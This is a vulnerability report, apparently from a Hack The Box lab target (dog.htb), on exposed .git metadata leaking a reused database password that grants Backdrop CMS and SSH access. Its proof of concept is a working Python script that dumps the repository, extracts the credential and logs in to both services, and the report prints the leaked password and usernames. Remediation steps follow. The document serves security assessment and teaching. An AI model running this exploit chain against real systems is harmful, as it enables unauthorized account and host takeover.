# Credential Exposure in Public Repository Enables Cross-Service Account Takeover

**ID:** vuln-0003
**Severity:** CRITICAL
**Found:** 2026-02-28 19:23:38 UTC
**Target:** http://dog.htb
**Endpoint:** /.git/HEAD, /.git/config, /?q=user/login, ssh://dog.htb:22
**Method:** GET, POST
**CWE:** CWE-798
**CVSS:** 10.0

## Description

Overview:
A credential exposure and reuse vulnerability was confirmed on dog.htb. Source control metadata was publicly accessible, allowing extraction of application source and configuration files. A database connection string containing cleartext credentials was disclosed and then successfully reused for authentication across multiple services.

Severity and CVSS:
This issue is rated Critical due to unauthenticated secret retrieval followed by valid authentication to both the web application and SSH service, resulting in direct host access.

Affected assets:
The issue affects the web application at dog.htb and the SSH service on the same host because the same credential value was accepted across service boundaries.

Technical details:
The exposed repository content contained a database DSN credential in cleartext:
mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop

The password value BackDropJ2024DS2024 was then validated as an active login secret for:
1) Backdrop CMS user authentication
2) SSH user authentication

This demonstrates a compound weakness:
1) Sensitive credential disclosure
2) Credential reuse across trust boundaries
3) Practical account takeover and host-level access from an external network position

## Impact

An external attacker can obtain valid secrets without authentication and pivot from web exposure to authenticated host access. This enables compromise of user accounts, unauthorized platform administration, lateral movement opportunities, and potential full system compromise when combined with post-authentication privilege escalation paths. Business impact includes loss of confidentiality and integrity of hosted data, service abuse, and elevated incident response scope due to multi-service credential trust collapse.

## Technical Analysis

The vulnerability chain is rooted in insecure secret handling and credential reuse policy failure.

Root cause:
1) A sensitive secret was stored in source-controlled configuration content and became retrievable due to repository exposure.
2) The same secret value was accepted in unrelated authentication contexts (application login and SSH access), violating credential isolation principles.
3) No compensating controls prevented reuse (for example, unique per-service secrets, forced rotation, or service-specific authentication policies).

Observed exploit path:
1) Retrieve exposed repository metadata and extract source/configuration.
2) Parse configuration for DSN credentials.
3) Reuse discovered password against web login to obtain authenticated application access.
4) Reuse same password against SSH to gain interactive host access.

This is not a theoretical risk; it was confirmed with successful authentication events on both services using the disclosed secret value.

## Proof of Concept

Proof of concept:
1. Send a request to exposed Git metadata to confirm repository disclosure:
   GET http://dog.htb/.git/HEAD
2. Reconstruct repository content from exposed .git metadata and retrieve configuration files.
3. Extract cleartext DSN credential from settings content:
   mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop
4. Submit web login request to Backdrop authentication endpoint with discovered credential pair and confirm authenticated session.
5. Attempt SSH authentication using the same password with a valid local username and confirm successful shell access.

Expected result:
The same disclosed password authenticates successfully across both web application and SSH, demonstrating cross-service credential reuse and account takeover.

```
import re
import requests
import subprocess
import tempfile
from pathlib import Path

BASE = "http://dog.htb"
LOGIN_URL = f"{BASE}/?q=user/login"
SSH_HOST = "dog.htb"
SSH_USER = "johncusack"

def check_git_exposure():
    r = requests.get(f"{BASE}/.git/HEAD", timeout=10)
    print("[*] /.git/HEAD status:", r.status_code)
    if r.status_code != 200:
        raise SystemExit("[-] Git metadata not exposed")
    print("[+] Git exposure confirmed")

def dump_repo(outdir: Path):
    cmd = ["git-dumper", f"{BASE}/.git/", str(outdir)]
    print("[*] Running:", " ".join(cmd))
    subprocess.run(cmd, check=True)

def extract_password(settings_path: Path):
    content = settings_path.read_text(errors="ignore")
    m = re.search(r"mysql://[^:]+:([^@]+)@[^/]+/[^'\\\"]+", content)
    if not m:
        raise SystemExit("[-] DSN credential not found")
    password = m.group(1)
    print("[+] Extracted password:", password)
    return password

def backdrop_login(username: str, password: str):
    s = requests.Session()
    r = s.get(LOGIN_URL, timeout=10)
    token = re.search(r'name="form_build_id" value="([^"]+)"', r.text)
    payload = {
        "name": username,
        "pass": password,
        "form_id": "user_login",
    }
    if token:
        payload["form_build_id"] = token.group(1)
    resp = s.post(LOGIN_URL, data=payload, timeout=10, allow_redirects=True)
    success = ("Log out" in resp.text) or ("dashboard" in resp.url.lower())
    print(f"[*] Web login as {username}: {'SUCCESS' if success else 'FAILED'}")
    return success

def ssh_check(username: str, password: str):
    cmd = [
        "sshpass", "-p", password,
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=8",
        f"{username}@{SSH_HOST}",
        "id"
    ]
    res = subprocess.run(cmd, capture_output=True, text=True)
    ok = res.returncode == 0 and "uid=" in res.stdout
    print(f"[*] SSH login as {username}: {'SUCCESS' if ok else 'FAILED'}")
    if res.stdout:
        print(res.stdout.strip())
    if res.stderr:
        print(res.stderr.strip())
    return ok

def main():
    check_git_exposure()
    with tempfile.TemporaryDirectory() as td:
        repo = Path(td) / "repo"
        dump_repo(repo)
        settings = repo / "settings.php"
        if not settings.exists():
            raise SystemExit("[-] settings.php not found in dumped repository")
        password = extract_password(settings)

        # Example web user validated during assessment
        backdrop_login("tiffany", password)

        # Example SSH user validated during assessment
        ssh_check(SSH_USER, password)

if __name__ == "__main__":
    main()
```

## Remediation

1. Remove public access to source control metadata immediately.
   - Deny all requests to .git and related VCS paths at web server and reverse proxy layers.
   - Validate with external scanning to ensure no VCS artifacts are web-accessible.

2. Rotate all potentially exposed secrets immediately.
   - Replace database, application, and SSH-related credentials.
   - Invalidate active sessions and tokens that may have been derived from compromised accounts.

3. Enforce unique credentials per service and per account.
   - Prohibit reuse of passwords/secrets across database, web application users, and system users.
   - Use centralized secret management for service credentials.

4. Remove hardcoded/plaintext credentials from code and configuration tracked in repositories.
   - Store secrets in dedicated secret stores or environment-injected secure configuration.
   - Add commit-time and CI secret scanning to block future exposures.

5. Harden authentication controls.
   - Enforce strong password policy and MFA for administrative access.
   - Apply SSH hardening (key-based auth where possible, least-privilege accounts, monitor failed/suspicious logins).

6. Implement continuous detection and prevention.
   - Add external attack-surface monitoring for sensitive artifacts.
   - Alert on authentication anomalies indicating credential stuffing/reuse attempts.
